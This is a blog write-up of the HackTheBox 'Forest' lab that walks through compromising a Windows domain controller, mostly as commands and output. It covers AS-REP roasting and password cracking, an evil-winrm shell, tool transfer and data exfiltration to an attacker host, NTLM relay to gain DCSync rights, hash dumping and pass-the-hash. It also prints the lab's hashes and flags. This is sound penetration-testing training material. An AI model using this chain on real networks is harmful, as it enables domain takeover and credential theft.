---
layout: post
title: HackTheBox Forest
date: 2019-10-12
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. ([Source](https://www.hackthebox.com/machines/forest))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# nmap -sC -sV -A -p- 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.0048s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-15 02:35:03Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=53%CT=1%CU=39946%PV=Y%DS=2%DC=T%G=Y%TM=62D0D0F
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:A)OPS(O1=M550NW8ST11%O2=M550NW8ST11%O3=M550NW8NNT11%O4=M550NW8ST11%O5=M5
OS:50NW8ST11%O6=M550ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M550NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m53s, deviation: 4h02m31s, median: 6m52s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2022-07-15T02:36:05
|_  start_date: 2022-07-15T02:33:18
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-07-14T19:36:04-07:00

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   3.81 ms 10.10.14.1
2   4.16 ms 10.10.10.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.42 seconds
```

There seems to be a `smb` server running! Lets try using `smbclient` to connect.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# smbclient -L 10.10.10.161              
Password for [WORKGROUP\root]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Unfortunately, there seems to be nothing.

Next, lets try `rpcclient`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

>   Side note: we can actually use `enum4linx` to automate `SMB/SAMBA/CIFS` enumeration! OwO
>
>   ```bash
>   ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
>   └─# enum4linux -a 10.10.10.161
>   ...
>    =======================================( Users on 10.10.10.161 )=======================================
>   ...
>   user:[Administrator] rid:[0x1f4]
>   user:[Guest] rid:[0x1f5]
>   user:[krbtgt] rid:[0x1f6]
>   user:[DefaultAccount] rid:[0x1f7]
>   user:[$331000-VK4ADACQNUCA] rid:[0x463]
>   user:[SM_2c8eef0a09b545acb] rid:[0x464]
>   user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
>   user:[SM_75a538d3025e4db9a] rid:[0x466]
>   user:[SM_681f53d4942840e18] rid:[0x467]
>   user:[SM_1b41c9286325456bb] rid:[0x468]
>   user:[SM_9b69f1b9d2cc45549] rid:[0x469]
>   user:[SM_7c96b981967141ebb] rid:[0x46a]
>   user:[SM_c75ee099d0a64c91b] rid:[0x46b]
>   user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
>   user:[HealthMailboxc3d7722] rid:[0x46e]
>   user:[HealthMailboxfc9daad] rid:[0x46f]
>   user:[HealthMailboxc0a90c9] rid:[0x470]
>   user:[HealthMailbox670628e] rid:[0x471]
>   user:[HealthMailbox968e74d] rid:[0x472]
>   user:[HealthMailbox6ded678] rid:[0x473]
>   user:[HealthMailbox83d6781] rid:[0x474]
>   user:[HealthMailboxfd87238] rid:[0x475]
>   user:[HealthMailboxb01ac64] rid:[0x476]
>   user:[HealthMailbox7108a4e] rid:[0x477]
>   user:[HealthMailbox0659cc1] rid:[0x478]
>   user:[sebastien] rid:[0x479]
>   user:[lucinda] rid:[0x47a]
>   user:[svc-alfresco] rid:[0x47b]
>   user:[andy] rid:[0x47e]
>   user:[mark] rid:[0x47f]
>   user:[santi] rid:[0x480]
>   ...
>   ```

Nice! We can view the list of users. Lets take note of these users!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# cat users.txt  
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Now, lets use `Impacket`'s `GetNPUsers` script to query users that does not require Kerberos preauthentication so that we can grab their TGTs (Ticket Granting Tickets) to crack.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -no-pass -format john    
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB.LOCAL:83eaf6df5506cbe209f4d3744cbb1735$fe1cf464a1e1f3bbc427008aa534c6ea07f89bb358102603af3d45db64968517df07f0d2914442647686ec4fa3a41d5f440a2bad6f2e73e15f002c7f83f6f930e04d10a78fd7180673e78c0c3d5e838d25a7e2f0b259a623453f3b89f9423c52eddd6ae02c788ebae6b40bec809593d5a853147b488bca96ba37ba44ce955ab5bcfc755cefcf2c4c7e92ba0a5b2d8327fb737e2bea6b9dbb2be2d8fd50a4efabb9b88544ec6db97c7893e55b128882a29ec1aa014bab005b0fb52213a76c773e37ea9355520737d840c8f28e74ca4d8bb0bdf912cd04940ae5bb034b7b601132d81244c05148
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Yay! We found a hash for the user `svc-alfresco`. Lets save it to a file and run `john`~

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt             ...
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
...
```

# Exploit

Now that we have a username and password, what should we do?

Recall that `nmap` showed that port `5985` is open. According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm), we can initiate a `WinRM` session!

Fortunately, there is an easy way to do so using `evil-winrm`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

# Privilege Escalation

Before we begin, lets find out more information regarding `svc-alfresco`.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/14/2022 8:20:14 PM
Password expires             Never
Password changeable          7/15/2022 8:20:14 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/14/2022 8:09:19 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.
```

Lets use `SharpHound` to gather all the AD information we need from this machine. 

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe

- evil-winrm -
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> powershell -c wget "http://10.10.14.5/SharpHound.exe" -outfile "SharpHound.exe"
```

Now, we can invoke `SharpHound` to collect the necessary data.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ./SharpHound.exe -c all
...
2022-07-14T21:53:29.1501079-07:00|INFORMATION|SharpHound Enumeration Completed at 9:53 PM on 7/14/2022! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> dir
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/14/2022   9:53 PM          17972 20220714215325_BloodHound.zip
-a----        7/14/2022   9:53 PM          19749 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        7/14/2022   9:51 PM         908288 SharpHound.exe
```

Great! Now that `SharpHound` is done collecting the necessary data, we can transfer the `zip` file back to our terminal using `impacket-smbserver`.

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# impacket-smbserver hound .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.161,55123)
[*] AUTHENTICATE_MESSAGE (\,FOREST)
[*] User FOREST\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa

- evil-winrm -
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20220714215325_BloodHound.zip \\10.10.14.5\hound\
```

Finally, we can use `BloodHound` to analyse the data. 

>   Note that we have to start a `neo4j console` before we can run `bloodhound`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# neo4j console
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# bloodhound     
...
```

Once `BloodHound` starts, we can upload the `zip` and then analyse the path from `SVC-ALFRESCO@HTB.LOCAL` to `ADMINISTRATOR@HTB.LOCAL`!

>   Remember to mark `SVC-ALFRESCO@HTB.LOCAL` as owned and then right click on `ADMINISTRATOR@HTB.LOCAL` to choose `Shortest Paths to Here from Owned`.
>
>   You may find redundant paths along the way due to some possible remote connection paths. To resolve this, you can just delete the nodes that you deem redundant. 

![bloodhound](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Forest/bloodhound.png?raw=true)

From the graph, we can see that `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` is what we need to join in order to perform a `WriteDacl`.

Searching `Exchange Windows Permissions Privilege Escalation` results in this interesting [article](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/).

>   When authentication is relayed to `LDAP`, objects in the directory can be modified to grant an attacker privileges, including the privileges required for `DCSync` operations. Thus, if we can get an Exchange server to authenticate to us with NTLM authentication, we can perform the ACL attack.

To perform the privilege escalation attack, we need create a new user and add it to the `Exchange Windows Permissions` group.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user shiro password /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" shiro /add
The command completed successfully.
```

Now, we have to use `ntlmrelayx.py` and `privexchange.py` to escalate the created user (both are already included in Kali). 

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user shiro
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Servers started, waiting for connections
...
```

From here, we can visit our own NTLM server on a browser at `http://localhost/privexchange` or `http://127.0.0.1/privexchange` to login with our newly created account!

Upon logging in, the script will attempt to add a `DCSync` privilege to the our user.

```bash
...
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Client requested path: /privexchange
[*] Authenticating against ldap://10.10.10.161 as \shiro SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User shiro now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20220715-115928.restore
[*] Authenticating against ldap://10.10.10.161 as \shiro SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[-] ACL attack already performed. Refusing to continue
```

Moving on, we can run `secretsdump.py` (also included in Kali) to dump the domain credentials.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# secretsdump.py -just-dc htb.local/shiro:password@10.10.10.161
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
FOREST$:aes256-cts-hmac-sha1-96:3a92bebc9c41101da30553cd01c8c9719a79c4a36bc640abe428792edfadd281
FOREST$:aes128-cts-hmac-sha1-96:75891b522547c5fa59383a5023ad52a6
FOREST$:des-cbc-md5:5d3de3a7bae0ad4f
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

Finally, we can use `psexec.py` to pass the hash and connect to the domain!

```powershell
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Forest]
└─# psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd Users

C:\Users>dir
09/22/2019  04:02 PM    <DIR>          .
09/22/2019  04:02 PM    <DIR>          ..
09/18/2019  10:09 AM    <DIR>          Administrator
11/20/2016  07:39 PM    <DIR>          Public
09/22/2019  03:29 PM    <DIR>          sebastien
09/22/2019  04:02 PM    <DIR>          svc-alfresco
               0 File(s)              0 bytes
               6 Dir(s)  10,432,155,648 bytes free

C:\Users>type svc-alfresco\Desktop\user.txt
812afe6e13c2ff41d9c7020f94f58f80

C:\Users>type Administrator\Desktop\root.txt
49607d808dda27f4807a9906e1507cb2
```

